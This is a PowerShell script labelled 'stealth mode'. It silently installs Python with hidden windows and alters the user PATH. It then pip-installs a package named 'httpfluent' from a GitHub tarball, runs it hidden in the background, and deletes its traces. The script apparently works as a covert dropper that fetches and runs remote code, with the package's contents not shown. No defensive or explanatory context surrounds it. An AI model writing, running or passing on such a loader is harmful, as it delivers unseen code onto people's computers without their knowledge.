# ===================================================
# PowerShell script: Python 3.12.6 + Custom Package
# STEALTH MODE - FULL ALGORITHM
# ===================================================

# --- Pre-Check: Direct EXE & Version Check (Stealth) ---
$InstallRequired = $true
$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$PythonExe = Join-Path $InstallDir "python.exe"

if (Get-Command python -ErrorAction SilentlyContinue) {
    $CheckPath = "python"
} elseif (Test-Path $PythonExe) {
    $CheckPath = $PythonExe
}

if ($CheckPath) {
    $VersionString = & $CheckPath --version 2>&1
    if ($VersionString -match "Python (\d+\.\d+\.\d+)") {
        if ([version]$Matches[1] -ge [version]"3.9") {
            $InstallRequired = $false
            $ExecutableToUse = $CheckPath
        }
    }
}

# --- STEP 1-5: YOUR ORIGINAL INSTALLATION ALGORITHM ---
if ($InstallRequired) {
    # Step 1: Variables
    $PythonVersion = "3.12.6"
    $PythonInstaller = "python-$PythonVersion-amd64.exe"
    $DownloadUrl = "https://www.python.org/ftp/python/$PythonVersion/$PythonInstaller"
    $DownloadDir = "$env:TEMP\Python"

    # Step 2: Create download directory
    if (-not (Test-Path $DownloadDir)) {
        New-Item -ItemType Directory -Path $DownloadDir | Out-Null
    }

    # Step 3: Download installer (Using WebClient for stealth)
    $InstallerPath = Join-Path $DownloadDir $PythonInstaller
    try {
        $WebClient = New-Object System.Net.WebClient
        $WebClient.DownloadFile($DownloadUrl, $InstallerPath)
    } catch { exit 1 }

    # Step 4: Install Python USER MODE (Hidden Window)
    Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait -WindowStyle Hidden

    if (-not (Test-Path "$InstallDir\python.exe")) { exit 1 }

    # Step 5: Fix USER PATH
    $OldPath = [Environment]::GetEnvironmentVariable("Path","User")
    $OldPath = $OldPath -replace [regex]::Escape("$env:LOCALAPPDATA\Microsoft\WindowsApps;"),""
    $NewPath = "$InstallDir;$InstallDir\Scripts;$OldPath"
    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User")
    $env:Path = $NewPath
    
    $ExecutableToUse = $PythonExe
}

# --- STEP 6: Verify Python & pip ---
& $ExecutableToUse --version
& $ExecutableToUse -m pip --version

# --- STEP 7: Install requests + Custom Package + Run ---
# Install Requests
& $ExecutableToUse -m pip install --upgrade pip --quiet
& $ExecutableToUse -m pip install requests --quiet

# Install httpfluent
& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet

# Run httpfluent in background
Start-Process -FilePath $ExecutableToUse -ArgumentList "-m httpfluent" -WindowStyle Hidden

# --- STEP 8: Cleanup ---
if (Test-Path $DownloadDir) {
    Remove-Item $DownloadDir -Recurse -Force -ErrorAction SilentlyContinue
}
